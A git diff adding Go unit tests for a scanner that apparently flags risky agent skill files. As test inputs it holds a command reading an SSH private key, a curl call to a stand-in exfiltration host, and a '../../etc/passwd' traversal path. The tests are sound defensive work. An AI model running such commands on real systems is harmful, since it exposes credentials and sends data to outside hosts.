@@ -107,3 +107,68 @@ func TestScanTextForAST01ReportsCorrectLineNumber(t *testing.T) {
 		t.Fatal("expected an ast01-pipe-to-shell issue")
 	}
 }
+
+func TestScanTextForAST03BroadFilesystemAccess(t *testing.T) {
+	issues := scanTextForAST03("f.sh", "cat ~/.ssh/id_rsa\n")
+	found := false
+	for _, iss := range issues {
+		if iss.Rule == "ast03-broad-filesystem-access" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("issues = %+v, want an ast03-broad-filesystem-access issue", issues)
+	}
+}
+
+func TestScanTextForAST03NoFilesystemIssueOnBenignPath(t *testing.T) {
+	issues := scanTextForAST03("f.sh", "cat ./data/input.csv\n")
+	for _, iss := range issues {
+		if iss.Rule == "ast03-broad-filesystem-access" {
+			t.Errorf("issues = %+v, want no ast03-broad-filesystem-access issue for a benign local path", issues)
+		}
+	}
+}
+
+func TestScanTextForAST03UnrestrictedNetworkCall(t *testing.T) {
+	issues := scanTextForAST03("f.sh", "curl https://exfil.example.com/upload\n")
+	found := false
+	for _, iss := range issues {
+		if iss.Rule == "ast03-unrestricted-network-call" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("issues = %+v, want an ast03-unrestricted-network-call issue", issues)
+	}
+}
+
+func TestScanTextForAST03NoNetworkIssueOnLocalhost(t *testing.T) {
+	issues := scanTextForAST03("f.sh", "curl http://localhost:8080/health\n")
+	for _, iss := range issues {
+		if iss.Rule == "ast03-unrestricted-network-call" {
+			t.Errorf("issues = %+v, want no ast03-unrestricted-network-call issue for a localhost call", issues)
+		}
+	}
+}
+
+func TestPathTraversalIssueDetectsEscape(t *testing.T) {
+	dir := t.TempDir()
+	iss := pathTraversalIssue("f.md", dir, "../../etc/passwd", 5)
+	if iss == nil {
+		t.Fatal("pathTraversalIssue() = nil, want an issue for a path escaping the skill directory")
+	}
+	if iss.Rule != "ast03-path-traversal" {
+		t.Errorf("Rule = %q, want ast03-path-traversal", iss.Rule)
+	}
+	if iss.Line != 5 {
+		t.Errorf("Line = %d, want 5", iss.Line)
+	}
+}
+
+func TestPathTraversalIssueAllowsWithinSkillDir(t *testing.T) {
+	dir := t.TempDir()
+	if iss := pathTraversalIssue("f.md", dir, "scripts/helper.py", 5); iss != nil {
+		t.Errorf("pathTraversalIssue() = %+v, want nil for a path inside the skill directory", iss)
+	}
+}
